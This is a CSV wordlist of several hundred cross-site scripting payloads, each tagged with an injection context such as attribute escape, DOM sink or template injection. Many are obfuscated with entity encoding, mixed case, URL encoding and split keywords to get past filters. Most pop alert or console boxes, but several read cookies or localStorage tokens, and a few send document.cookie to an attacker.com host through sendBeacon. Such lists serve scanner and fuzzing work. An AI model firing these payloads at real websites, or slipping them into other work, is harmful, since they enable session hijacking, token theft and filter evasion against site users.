payload,context
"location.href=""javascript:\u0061lert(document.domain)""",dom_sink
"%3C!--%3E%3Cbase ontouchmove=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"\"" onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//",attribute_escape
<titl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS') onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection
%3C!--%3E%3Clink onwaiting=confirm(1)%3E,tag_injection
onc&#97;npl&#97;y=confirm&#40;1&#41;,event_handler
\' ondblclick=console.log('XSS')//,attribute_escape
JavAscRipT:%0apRomPt(DocUmeNt.DomAin),js_uri
__${\u0061lert(document.domain)}__::.x,template_injection
"(n&#101;w Function(""consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))""))();",dom_sink
"__pRotO__[""oNpaGesWap""]=ProMpt(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
\%22 ondblclick=alert(1)//,attribute_escape
%3Ctr	onpointerrawupdate=alert(location.hash)%3E,tag_injection
onfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log&#40;1&#41;,event_handler
<mtext onmousedown=console.log(1)/>,tag_injection
""" ><svG oNblUr=AleRt(DocUmeNt.DomAin)>",attribute_escape
onpageswap=javascr	ipt:console.log(location.hash),event_handler
"'><img src=x ontransitionrun=alert(String.fromCharCode(88,83,83))>",attribute_escape
<&#97;nim&#97;t&#101;motion on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS')>,tag_injection
"<anImaTetRanSfoRm OndRagOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
"<SCRIPT>\u0061lert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection
"s&#101;tTim&#101;out(""&#97;l&#101;rt(docum&#101;nt.dom&#97;in)"",0)",dom_sink
"<diV sRc=X oNweBkiTfuLlsCreEncHanGe=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
\' OngEstUreEnd=coNfiRm('XSS')//,attribute_escape
OnmOusEenTer=jaVasCriPt:AleRt(1),event_handler
"""%3E%3Cscript%3Eprompt('XSS')%3C/script%3E",script_injection
onfullscreenchange=javascr	ipt:console.log(1),event_handler
"%27 ><svg ongotpointercapture=confirm(String.fromCharCode(88,83,83))>",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNtoUchMovE"":EvaL})",dom_sink
onkeydown=alert&#40;%27XSS%27&#41;,event_handler
onsubmit=javascript:confirm(1),event_handler
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=consol&#101;.log(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>"")",dom_sink
<noscript x=y onbeforematch=console.log('XSS')>,tag_injection
<listing ontransitionstart=confirm(document.domain)>,tag_injection
javascript:%0aprompt(1),js_uri
 onr&#101;p&#101;&#97;t=consol&#101;.log(loc&#97;tion.h&#97;sh),event_handler
"	ongotpointercapture=\u0061lert(String.fromCharCode(88,83,83))",event_handler
<scr	ipt>window['confirm'](1)</scr	ipt>,script_injection
onpointerrawupdate=\u0061lert('XSS'),event_handler
"<svG
oNbeForEcoPy=ProMpt(doCumEnt.doMaiN)>",tag_injection
document.querySelector(%22body%22).innerHTML+=%22XMLHttpRequest(document.cookie)%22,dom_sink
`%3E%3Cimg src=x onfocus=console.log(location.hash)%3E,attribute_escape
{{cOnsTruCtoR.cOnsTruCtoR('AleRt(DocUmeNt.DomAin)')()}},template_injection
"LocAtiOn.HreF=""JavAscRipT:aLerT(bToa(doCumEnt.coOkiE))""",dom_sink
'><img src=x onp&#97;g&#101;hid&#101;=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
"LocAtiOn.HreF=""JavAscRipT:pRomPt(LocAtiOn.HasH)""",dom_sink
%22 ontransitionend=confirm(%27XSS%27) %22,attribute_escape
"' ><svg onpointerover=console.log(String.fromCharCode(88,83,83))>",attribute_escape
'><Img srC=x onDraGstArt=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
"<xmp onfocusout=prompt(String.fromCharCode(88,83,83))/>",tag_injection
<animatetransform onpointerdown=prompt(1) onpointerdown=prompt(1)>,tag_injection
"__proto__[""ong&#101;stur&#101;st&#97;rt""]=&#101;v&#97;l(loc&#97;tion.h&#97;sh)",dom_sink
%3Cblink onmouseup=alert(1)/%3E,tag_injection
`%3E%3Cimg src=x onended=prompt('XSS')%3E,attribute_escape
%22 ><svg onmousewheel=prompt(%27XSS%27)>,attribute_escape
"""><img src=x oninv&#97;lid=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNfoCusOut"":eVal})",dom_sink
""" ><svg onclos&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"`><img src=x onpl&#97;y=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
`%3E%3Cimg src=x onended=alert('XSS')%3E,attribute_escape
&quot; onpl&#97;ying=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
onc&#97;npl&#97;y=confirm/*x*/(1),event_handler
%22><img src=x onscrollend=prompt(location.hash)>,attribute_escape
""" onmous&#101;wh&#101;&#101;l=consol&#101;.log(1) """,attribute_escape
<scRipT>/X/cOnfIrm('XSS')</ScrIpt>,script_injection
"<set
onwebkitfullscreenchange=console.log('XSS')>",tag_injection
' oNpoPstAte=alErt(doCumEnt.doMaiN) ',attribute_escape
%3C!--%3E%3Ctable onmozfullscreenchange=confirm(1)%3E,tag_injection
"data:text/html,<script>confirm(%27XSS%27)</script>",js_uri
' ontouch&#101;nd=&#97;l&#101;rt('XSS') ',attribute_escape
"document.write(""%3Cimg src=x onerror=alert(btoa(document.cookie))%3E"")",dom_sink
"Object.assign(window,{""onmousewheel"":alert})",dom_sink
"`><Img srC=x onDraGovEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
"<body x=y ong&#101;stur&#101;st&#97;rt=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"location=""javascr	ipt:confirm('//attacker.com/?c='+document.cookie)""",dom_sink
{{{confirm(document.domain)}}},template_injection
onrepeat=\u0061lert('XSS'),event_handler
"%22 ><svg onerror=alert(String.fromCharCode(88,83,83))>",attribute_escape
' ><svG oNanImaTioNitEraTioN=pRomPt(1)>,attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=f&#101;tch(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
<form ongesturestart=console.log(%27XSS%27)/>,tag_injection
<div x=y onpause=confirm(location.hash)>,tag_injection
<noScrIpt	onPasTe=ConFirM(lOcaTioN.hAsh)>,tag_injection
<table x=y onmozfullscreenchange=confirm(1)>,tag_injection
"""><Img srC=x onCopY=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape
""" ><svg onpromptdismiss=alert(document.domain)>",attribute_escape
'><img src=x onk&#101;ypr&#101;ss=&#97;l&#101;rt(1)>,attribute_escape
"""><img src=x ontoggle=console.log('XSS')>",attribute_escape
"&quot; onpointermove=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
"""%3E%3Cimg src=x onanimationend=console.log('XSS')%3E",attribute_escape
`%3E%3Cimg src=x ontouchstart=console.log(document.domain)%3E,attribute_escape
{{constructor['constructor']('prompt(document.cookie)')()}},template_injection
"<title
onblur=console.log(location.hash)>",tag_injection
<xss onend=prompt('XSS')/>,tag_injection
	onst&#97;ll&#101;d=confirm(loc&#97;tion.h&#97;sh),event_handler
'><img src=x ondrop=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
"__proto__[""onwebkitanimationend""]=alert('XSS')",dom_sink
document.querySelector(%22body%22).innerHTML+=%22prompt(document.cookie)%22,dom_sink
"'><Img srC=x onAniMatIonIteRatIon=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
<%= coNfiRm DocUmeNt.DomAin %>,template_injection
<td	onk&#101;yup=confirm(docum&#101;nt.dom&#97;in)>,tag_injection
<&#101;mb&#101;d/onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
"\%27 ontransitionstart=confirm(String.fromCharCode(88,83,83))//",attribute_escape
ondblclick=console.log(1),event_handler
""" ><svg onpointerdown=alert(document.domain)>",attribute_escape
""" ><svg ondr&#97;g&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
"__proto__[""ongesturestart""]=eval(document.cookie+'&loc='+location.href)",dom_sink
%27><img src=x onpointerdown=console.log(document.domain)>,attribute_escape
eval(%22console.log(btoa(document.cookie))%22),dom_sink
"""><ScrIpt>prOmpT(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"<meta
onpointerover=confirm(1)>",tag_injection
"""><Img srC=x onBegIn=ConFirM(1)>",attribute_escape
"<m&#101;t&#97;
ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
'><Img srC=x onWebKitAniMatIonEnd=coNfiRm('XSS')>,attribute_escape
<link x=y onw&#97;iting=confirm(1)>,tag_injection
"""><img src=x onb&#101;for&#101;copy=prompt(loc&#97;tion.h&#97;sh)>",attribute_escape
<embed onmouseenter=confirm('XSS')>,tag_injection
"(n&#101;w Function(""prompt(docum&#101;nt.cooki&#101;)""))();",dom_sink
"\"" onpoint&#101;rov&#101;r=consol&#101;.log('XSS')//",attribute_escape
<iframe/onsecuritypolicyviolation=confirm(%27XSS%27)>,tag_injection
<!--><titl&#101; onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection
" onfullscreenchange=console.log(String.fromCharCode(88,83,83))",event_handler
<&#97;nim&#97;t&#101; onp&#97;g&#101;show=consol&#101;.log('XSS')/>,tag_injection
\%22 onbeforeinput=console.log(%27XSS%27)//,attribute_escape
""" ontouchst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
onkeypress=javascript:prompt(document.domain),event_handler
"\' onclos&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape
""" ><svg onp&#97;us&#101;=confirm('XSS')>",attribute_escape
""" %3E%3Csvg oncanplay=confirm(location.hash)%3E",attribute_escape
`><img src=x onpopstate=\u0061lert(location.hash)>,attribute_escape
<script>/x/prompt(document.domain)</script>,script_injection
""" ontoggle=confirm(String.fromCharCode(88,83,83)) """,attribute_escape
""" onbegin=alert(String.fromCharCode(88,83,83)) """,attribute_escape
"<scr	ipt
>alert(1)</scr	ipt>",script_injection
\' onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt('XSS')//,attribute_escape
"__proto__[""onchange""]=prompt(document.cookie)",dom_sink
`%3E%3Cimg src=x onwebkitfullscreenchange=prompt('XSS')%3E,attribute_escape
<maTh OnsCroLleNd=ProMpt(doCumEnt.doMaiN)>,tag_injection
%22><base oninvalid=confirm(location.hash)>,tag_injection
' onscrollend=prompt(location.hash) ',attribute_escape
"&quot; onscrollend=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape
javascript:/*-/*`/*\`/*%27/*%22/**/(/* */oNcliCk=console.log(%27XSS%27) )//%0D%0A%0d%0a,js_uri
"Object.assign(window,{""oncut"":eval})",dom_sink
\' onmouseenter=alert(document.domain)//,attribute_escape
<tiTle onMozFulLscReeNchAngE=pRomPt('XSS')>,tag_injection
JAVASCRIPT:pRomPt(DocUmeNt.DomAin),js_uri
"WinDow[""fEtcH""](StRinG.fRomChaRCoDe(88,83,83))",dom_sink
<scRipT>wIndOw['alErt']('XSS')</sCriPt>,script_injection
${aLerT('XSS')},template_injection
'><Img srC=x onMouSeeNteR=aLerT(lOcaTioN.hAsh)>,attribute_escape
' onplay=confirm('XSS') ',attribute_escape
"&quot; onr&#101;s&#101;t=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
`><img src=x ondblclick=\u0061lert(1)>,attribute_escape
<plAinTexT	oNrePeaT=pRomPt('XSS')>,tag_injection
"%27 onpause=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
`><img src=x onpopst&#97;t&#101;=prompt(1)>,attribute_escape
<%= confirm docum&#101;nt.cooki&#101; %>,template_injection
<b&#97;s&#101; src=x onb&#101;for&#101;copy=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
' oNpoPstAte=prOmpT(1) ',attribute_escape
JavAscRipT:vOid(coNfiRm(LocAtiOn.HasH)),js_uri
location.href=%22javascript:confirm(document.domain)%22,dom_sink
<emBed	onWebKitFulLscReeNchAngE=cOnfIrm(loCatIon.haSh)>,tag_injection
"""><&#101;mb&#101;d onmozfullscr&#101;&#101;nch&#97;ng&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection
"(neW FUncTioN(""ProMpt(btOa(DocUmeNt.CooKie))""))();",dom_sink
%27><img src=x onmouseenter=alert(location.hash)>,attribute_escape
""" oNclIck=coNfiRm('XSS') """,attribute_escape
OnpOinTerUp=ProMpt/**/(dOcuMenT.dOmaIn),event_handler
onpageswap=console.log&#40;location.hash&#41;,event_handler
	ondrop=console.log(document.domain),event_handler
"EvaL(""XMLHttPReQueSt(LocAlSTorAge.geTItEm('toKen'))"")",dom_sink
' %3E%3Csvg ontouchstart=console.log(1)%3E,attribute_escape
' ><svg onp&#97;g&#101;show=consol&#101;.log('XSS')>,attribute_escape
<listing ontr&#97;nsitionst&#97;rt=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt(1),event_handler
"%22 ><svg onpromptdismiss=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"eval(""\u0061lert(localStorage.getItem('token'))"")",dom_sink
OnpAgeHidE=pRomPt&#40;doCumEnt.doMaiN&#41;,event_handler
"""><animatemotion onanimationiteration=console.log('XSS')>",tag_injection
<mtext onfocusout=confirm(location.hash)>,tag_injection
`><img src=x onpoint&#101;rov&#101;r=consol&#101;.log('XSS')>,attribute_escape
"&quOt; onMouSeeNteR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) x=&qUot;",attribute_escape
onsubmit=alert&#40;location.hash&#41;,event_handler
""" ><svG oNgeStuReeNd=ConSolE.lOg('XSS')>",attribute_escape
<listing src=x onkeyup=alert(location.hash)>,tag_injection
ontr&#97;nsitionrun=j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler
"'><Img srC=x onFocUs=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
%27><img src=x onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape
"document.body.innerHTML=""<img src=x onerror=eval(btoa(document.cookie))>""",dom_sink
${confirm?new()(%27%27XSS%27%27)},template_injection
<boDy X=y onCloSe=ConSolE.lOg('XSS')>,tag_injection
#set($x='confirm(document.domain)')$x,template_injection
%27 ><svg onplaying=alert(location.hash)>,attribute_escape
OnpLayIng=jaVasCriPt:ConSolE.lOg(1),event_handler
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""consol&#101;.log(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))"")",dom_sink
"""><obj&#101;ct on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
<maTh OniNvaLid=coNfiRm('XSS') onInvAliD=cOnfIrm('XSS')>,tag_injection
&quot; onsearch=confirm(1) x=&quot;,attribute_escape
"""><Img srC=x onTraNsiTioNruN=cOnsOle.loG('XSS')>",attribute_escape
"""><img src=x onpopst&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",attribute_escape
""" ><svG oNinValId=AleRt(DocUmeNt.DomAin)>",attribute_escape
"Object.assign(window,{%22onanimationiteration%22:alert})",dom_sink
{{constructor['constructor']('alert(document.domain)')()}},template_injection
' onb&#101;for&#101;m&#97;tch=confirm(1) ',attribute_escape
""" oNtoUchEnd=prOmpT('XSS') """,attribute_escape
<scr	ipt>/x/alert(location.hash)</scr	ipt>,script_injection
<!--><select ongotpointercapture=confirm(document.domain)>,tag_injection
""" %3E%3Csvg onbeforetoggle=alert(location.hash)%3E",attribute_escape
"<blink
onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
	onwh&#101;&#101;l=prompt(1),event_handler
"window[""console.log""](btoa(document.cookie))",dom_sink
&quot; onprompt&#97;ction=prompt(1) x=&quot;,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;)>"")",dom_sink
<noscript/onpointerdown=prompt(document.domain)>,tag_injection
"__proto__[""onbeforepaste""]=fetch(document.cookie+'&loc='+location.href)",dom_sink
"""><Img srC=x onMouSeoVer=prOmpT(1)>",attribute_escape
OnsCroLlsNapChaNge=alErt/*x*/(1),event_handler
onscrollend=console.log/*x*/(location.hash),event_handler
 ons&#101;curitypolicyviol&#97;tion=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""prOmpT(dOcuMenT.dOmaIn)""",dom_sink
%3Cmath onmouseup=console.log(document.domain)%3E,tag_injection
<base onkeydown=alert('XSS')/>,tag_injection
%27 ondblclick=confirm(1) %27,attribute_escape
"' ><svg onanimationend=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
\' OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')//,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))>"")",dom_sink
<audio onplay=console.log(1) onplay=console.log(1)>,tag_injection
OnaNimAtiOneNd=ProMpt&#40;1&#41;,event_handler
"\"" OncHanGe=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape
onanimationend=console.log/**/('XSS'),event_handler
<!--><img onwebkitfullscreenchange=\u0061lert('XSS')>,tag_injection
"Object.assign(window,{""onbeforecut"":\u0061lert})",dom_sink
"setTimeout(""XMLHttpRequest(document.domain)"",0)",dom_sink
onmouseenter=javascr	ipt:prompt(1),event_handler
"%22 ><svg onfocusout=console.log(String.fromCharCode(88,83,83))>",attribute_escape
`><img src=x ontr&#97;nsition&#101;nd=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"__proto__[""onmous&#101;ov&#101;r""]=consol&#101;.log(loc&#97;tion.h&#97;sh)",dom_sink
' ><svG oNmoZfuLlsCreEncHanGe=AleRt(1)>,attribute_escape
 onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt(1),event_handler
%3Cset x=y onend=alert(1)%3E,tag_injection
""" ><svg onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"eval(%22alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22)",dom_sink
%3Cscript%3Econfirm(location.hash)%3C/script%3E,script_injection
OnmOusEenTer=prOmpT/**/(1),event_handler
<obj&#101;ct	onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1)>,tag_injection
""" ><svg ongestureend=confirm('XSS')>",attribute_escape
"Object.assign(window,{""onrepeat"":alert})",dom_sink
ongesturestart=confirm(document.domain),event_handler
"""><form onpagehide=confirm(1)>",tag_injection
<img	onwebkitfullscreenchange=alert('XSS')>,tag_injection
%3Ctr src=x onanimationend=prompt('XSS')%3E,tag_injection
' onend=\u0061lert('XSS') ',attribute_escape
%3Clisting onkeyup=alert(location.hash)%3E,tag_injection
on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt/***/('XSS'),event_handler
' ><svg onpaste=console.log(document.domain)>,attribute_escape
onb&#101;for&#101;p&#97;st&#101;=confirm&#40;1&#41;,event_handler
<s&#101;t onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log('XSS')>,tag_injection
<anImaTetRanSfoRm OnpOinTerMovE=cOnsOle.loG('XSS')/>,tag_injection
<&#97;nim&#97;t&#101;motion src=x ondrop=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
 onWheEl=ConSolE.lOg(DocUmeNt.DomAin),event_handler
\' onerror=\u0061lert(1)//,attribute_escape
%27 ><svg ondragenter=confirm(%27XSS%27)>,attribute_escape
""" ontransitionrun=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
%22 onmouseover=prompt(location.hash) x=%22,attribute_escape
\' onbeforecut=alert(document.domain)//,attribute_escape
"<xmP oNmoUseWheEl=ProMpt(StRinG.fRomChaRCoDe(88,83,83)) oNmoUseWheEl=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection
{% ConFirM 1 %},template_injection
"%27><img src=x onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape
"__pRotO__[""oNinPut""]=ProMpt(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))",dom_sink
<!--><Img onResEt=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
"""><img src=x on&#101;rror=&#97;l&#101;rt(1)>",attribute_escape
""" ><svG oNstAllEd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape
"EleMenT.sEtATtrIbuTe(""onCliCk"",""eVal(1)"")",dom_sink
{{$on.constructor('\u0061lert('XSS')')()}},template_injection
<spAn X=y onCopY=pRomPt(LocAtiOn.HasH)>,tag_injection
%22 onmouseover=prompt(1) x=%22,attribute_escape
' ><svG oNbeForEpaSte=prOmpT(1)>,attribute_escape
%27 onend=confirm(%27XSS%27) %27,attribute_escape
"%27><img src=x onkeydown=prompt(String.fromCharCode(88,83,83))>",attribute_escape
\' onpopstate=alert(1)//,attribute_escape
<buTtoN oNdrAgeNteR=aLerT(lOcaTioN.hAsh)/>,tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=XMLHTtpReqUesT(dOcuMenT.dOmaIn)>"")",dom_sink
' ><svg ontouchmov&#101;=prompt('XSS')>,attribute_escape
"\"" onerror=\u0061lert(1)//",attribute_escape
"s&#101;tTim&#101;out(""prompt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))"",0)",dom_sink
"""%3E%3Cxmp ontouchend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
<boDy Src=x OniNvaLid=alErt(loCatIon.haSh)>,tag_injection
"' oNcoPy=AleRt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
